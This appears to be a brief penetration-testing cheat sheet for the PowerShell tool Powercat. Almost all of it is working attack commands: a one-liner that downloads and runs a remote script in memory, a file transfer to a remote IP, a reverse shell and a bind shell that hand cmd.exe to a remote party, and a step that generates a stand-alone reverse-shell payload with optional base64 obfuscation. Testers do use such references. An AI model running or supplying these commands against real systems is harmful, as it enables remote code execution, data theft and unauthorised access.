---
title: Powercat
author: i4
date: M01-10-2023
---

## Download
```
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

## File Transfer

Takes an input file `-i` and transfers it to the destination ip `-c`
```
powercat -c x.x.x.x -p x -i C:\path\to\file
```

## Reverse Shell

```
powercat -c x.x.x.x -p x -e cmd.exe
```

## Bind shell

Starts a listener on port `x` piping input to cmd

```
powercat -l -p x -e cmd.exe
```

## Stand-Alone Payloads

Powercat can create stand-alone payloads that only includes the needed functionality.

- `-ge` can be used to obfuscate the code as base64

```
powercat -c x.x.x.x -p x -e cmd.exe -g > reverseshell.ps1
```


